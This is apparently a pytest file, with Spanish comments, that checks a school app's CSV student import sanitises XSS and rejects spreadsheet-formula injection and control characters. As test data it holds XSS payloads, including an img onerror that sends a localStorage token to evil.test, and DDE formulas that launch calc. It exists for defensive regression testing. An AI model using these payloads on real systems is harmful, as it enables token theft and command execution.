"""
Sprint xss-host-header — segundo eslabón de la cadena descrita en
AUDITORIA-BETA.md #1/#4: el import CSV de estudiantes construía el ORM
directo desde las celdas crudas, sin pasar por EstudianteCreate — lo que
permitía guardar HTML/script sin sanitizar en `diagnostico`/`ajustes`
(datos PIAR de menores), que luego un chat con IA podía terminar
repitiendo y ejecutando al renderizarse (ver test_chat_render_seguro.py
para el primer eslabón, la sanitización del render).

Cubre:
- HTML/script en cualquier campo de texto se sanitiza con bleach al
  GUARDAR (ya no sólo al crear un estudiante individual) — los datos
  sucios nunca llegan a la base de datos.
- Inyección de fórmulas de hoja de cálculo (celda que empieza con
  =, +, - o @) rechaza la fila entera, con mensaje claro de fila+columna.
- Caracteres de control rechazan la fila entera.
- Longitud máxima se sigue validando (vía EstudianteCreate, igual que la
  creación individual).
"""
from __future__ import annotations

import io

ENDPOINT = "/api/grupos/{gid}/estudiantes/importar"


def _upload(client, grupo_id: str, csv_text: str, filename: str = "test.csv"):
    return client.post(
        ENDPOINT.format(gid=grupo_id),
        files={"file": (filename, io.BytesIO(csv_text.encode("utf-8")), "text/csv")},
    )


# ═══════════════════════════════════════════════════════════════
# Sanitización HTML/XSS al guardar (bleach vía EstudianteCreate)
# ═══════════════════════════════════════════════════════════════

def test_script_en_diagnostico_se_sanitiza_al_guardar(client, seed_docente, db_session):
    from models import Estudiante
    gid = seed_docente["grupo"].id_grupo
    csv = (
        "codigo_estudiante,genero,tiene_piar,diagnostico,ajustes\n"
        'E001,M,1,"<script>alert(document.cookie)</script>TDA",\n'
    )
    r = _upload(client, gid, csv)
    assert r.status_code == 200, r.text
    body = r.json()
    assert body["creados"] == 1
    assert body["fallidos"] == 0

    est = db_session.query(Estudiante).filter(
        Estudiante.id_grupo == gid, Estudiante.codigo_estudiante == "E001",
    ).first()
    assert est is not None
    # El tag nunca sobrevive — lo que quede es texto plano, sin < >.
    assert "<script" not in est.diagnostico.lower()
    assert "<" not in est.diagnostico
    assert "TDA" in est.diagnostico


def test_html_en_nombre_estudiante_se_sanitiza_al_guardar(client, seed_docente, db_session):
    """El payload que arma la cadena completa de la auditoría: un
    <img onerror=...> en el propio nombre del estudiante (codigo_estudiante)."""
    from models import Estudiante
    gid = seed_docente["grupo"].id_grupo
    payload = "<img src=x onerror=\"fetch('https://evil.test/?c='+localStorage.getItem('token'))\">Juan"
    csv = (
        "codigo_estudiante,genero,tiene_piar,diagnostico,ajustes\n"
        f'"{payload}",M,0,,\n'
    )
    r = _upload(client, gid, csv)
    assert r.status_code == 200, r.text
    assert r.json()["creados"] == 1

    est = db_session.query(Estudiante).filter(Estudiante.id_grupo == gid).first()
    assert est is not None
    assert "<img" not in est.codigo_estudiante.lower()
    assert "onerror" not in est.codigo_estudiante.lower()
    assert "Juan" in est.codigo_estudiante


def test_html_en_ajustes_se_sanitiza_al_actualizar_estudiante_existente(client, seed_docente, db_session):
    """El bypass original era más grave todavía en el camino de UPDATE
    (setattr directo) — confirmar que también quedó cerrado."""
    from models import Estudiante
    gid = seed_docente["grupo"].id_grupo
    csv1 = "codigo_estudiante,genero,tiene_piar,diagnostico,ajustes\nE100,M,0,,\n"
    assert _upload(client, gid, csv1).json()["creados"] == 1

    csv2 = (
        "codigo_estudiante,genero,tiene_piar,diagnostico,ajustes\n"
        'E100,M,0,,"<script>document.location=\'https://evil.test\'</script>Requiere apoyo"\n'
    )
    r2 = _upload(client, gid, csv2)
    assert r2.status_code == 200, r2.text
    assert r2.json()["actualizados"] == 1

    est = db_session.query(Estudiante).filter(
        Estudiante.id_grupo == gid, Estudiante.codigo_estudiante == "E100",
    ).first()
    assert "<script" not in est.ajustes.lower()
    assert "Requiere apoyo" in est.ajustes


def test_longitud_maxima_se_valida_igual_que_creacion_individual(client, seed_docente):
    """codigo_estudiante > 100 chars debe rechazar la fila (mismo límite
    que EstudianteCreate.codigo_estudiante = Field(max_length=100))."""
    gid = seed_docente["grupo"].id_grupo
    codigo_largo = "X" * 150
    csv = f"codigo_estudiante,genero,tiene_piar,diagnostico,ajustes\n{codigo_largo},M,0,,\n"
    body = _upload(client, gid, csv).json()
    assert body["creados"] == 0
    assert body["fallidos"] == 1
    assert "Fila 2" in body["errores"][0]
    assert "codigo_estudiante" in body["errores"][0]


# ═══════════════════════════════════════════════════════════════
# Inyección de fórmulas de hoja de cálculo (CWE-1236)
# ═══════════════════════════════════════════════════════════════

def test_celda_con_formula_igual_rechaza_la_fila(client, seed_docente, db_session):
    from models import Estudiante
    gid = seed_docente["grupo"].id_grupo
    csv = (
        "codigo_estudiante,genero,tiene_piar,diagnostico,ajustes\n"
        '=SUM(A1:A10),M,0,,\n'
        "E002,F,0,,\n"
    )
    r = _upload(client, gid, csv)
    assert r.status_code == 200, r.text
    body = r.json()
    assert body["creados"] == 1  # sólo E002
    assert body["fallidos"] == 1
    assert "Fila 2" in body["errores"][0]
    assert "codigo_estudiante" in body["errores"][0]
    assert "fórmula" in body["errores"][0].lower()

    # La fila rechazada NUNCA se guardó — ni pelada, ni a medias.
    restantes = db_session.query(Estudiante).filter(Estudiante.id_grupo == gid).all()
    assert len(restantes) == 1
    assert restantes[0].codigo_estudiante == "E002"


def test_celdas_con_prefijos_de_formula_variados_rechazan(client, seed_docente):
    """+, - y @ son tan peligrosos como = en Excel/Sheets — los cuatro
    deben rechazar."""
    gid = seed_docente["grupo"].id_grupo
    for i, prefijo in enumerate(("=", "+", "-", "@"), start=1):
        csv = (
            "codigo_estudiante,genero,tiene_piar,diagnostico,ajustes\n"
            f"{prefijo}cmd|'/c calc'!A1,M,0,,\n"
        )
        body = _upload(client, gid, csv, filename=f"f{i}.csv").json()
        assert body["creados"] == 0, f"prefijo {prefijo!r} debería rechazar la fila"
        assert body["fallidos"] == 1
        assert "fórmula" in body["errores"][0].lower()


def test_formula_en_columna_diagnostico_tambien_rechaza(client, seed_docente):
    """No sólo codigo_estudiante — cualquier columna de texto libre
    puede llevar el payload."""
    gid = seed_docente["grupo"].id_grupo
    csv = (
        "codigo_estudiante,genero,tiene_piar,diagnostico,ajustes\n"
        '=cmd|"/c calc"!A1,M,1,"=HYPERLINK(""http://evil.test"")",\n'
    )
    body = _upload(client, gid, csv).json()
    assert body["creados"] == 0
    assert body["fallidos"] == 1
    assert "codigo_estudiante" in body["errores"][0]  # se revisa en orden, cae en la primera columna riesgosa


def test_formula_con_espacio_adelante_igual_se_detecta(client, seed_docente):
    """' =cmd' con espacio inicial también dispara — Excel lo interpreta
    igual una vez abre el archivo."""
    gid = seed_docente["grupo"].id_grupo
    csv = (
        "codigo_estudiante,genero,tiene_piar,diagnostico,ajustes\n"
        '"  =cmd|\'/c calc\'!A1",M,0,,\n'
    )
    body = _upload(client, gid, csv).json()
    assert body["creados"] == 0
    assert body["fallidos"] == 1


# ═══════════════════════════════════════════════════════════════
# Caracteres de control
# ═══════════════════════════════════════════════════════════════

def test_caracteres_de_control_rechazan_la_fila(client, seed_docente, db_session):
    from models import Estudiante
    gid = seed_docente["grupo"].id_grupo
    # \x01 (no \x00/NUL): el propio módulo csv de la stdlib no puede
    # parsear una línea con NUL — ver test_nul_byte_rechaza_el_archivo_completo
    # para ese caso, que falla a nivel de archivo, no de fila.
    payload_con_control = "Juan\x01Perez"
    csv = (
        "codigo_estudiante,genero,tiene_piar,diagnostico,ajustes\n"
        f'"{payload_con_control}",M,0,,\n'
    )
    r = _upload(client, gid, csv)
    assert r.status_code == 200, r.text
    body = r.json()
    assert body["creados"] == 0
    assert body["fallidos"] == 1
    assert "caracteres de control" in body["errores"][0].lower()
    assert db_session.query(Estudiante).filter(Estudiante.id_grupo == gid).count() == 0


def test_nul_byte_rechaza_el_archivo_completo(client, seed_docente):
    """Un NUL rompe el parseo de csv.DictReader a nivel de archivo (no
    de fila) — antes de este fix eso propagaba como un 500 sin mensaje;
    ahora se rechaza con un 400 claro."""
    gid = seed_docente["grupo"].id_grupo
    csv_con_nul = "codigo_estudiante,genero\nJuan\x00Perez,M\n"
    r = _upload(client, gid, csv_con_nul)
    assert r.status_code == 400
    assert "caracteres de control" in r.text.lower()


# ═══════════════════════════════════════════════════════════════
# El resto del import sigue funcionando igual (no regresión)
# ═══════════════════════════════════════════════════════════════

def test_filas_validas_conviven_con_filas_rechazadas(client, seed_docente, db_session):
    from models import Estudiante
    gid = seed_docente["grupo"].id_grupo
    csv = (
        "codigo_estudiante,genero,tiene_piar,diagnostico,ajustes\n"
        "Ana,F,0,,\n"
        "=cmd|'/c calc'!A1,M,0,,\n"
        "Beto\x01,M,0,,\n"
        "Carla,F,1,TDA,Tiempo extra\n"
    )
    body = _upload(client, gid, csv).json()
    assert body["creados"] == 2
    assert body["fallidos"] == 2
    assert len(body["errores"]) == 2

    nombres = {
        e.codigo_estudiante
        for e in db_session.query(Estudiante).filter(Estudiante.id_grupo == gid).all()
    }
    assert nombres == {"Ana", "Carla"}
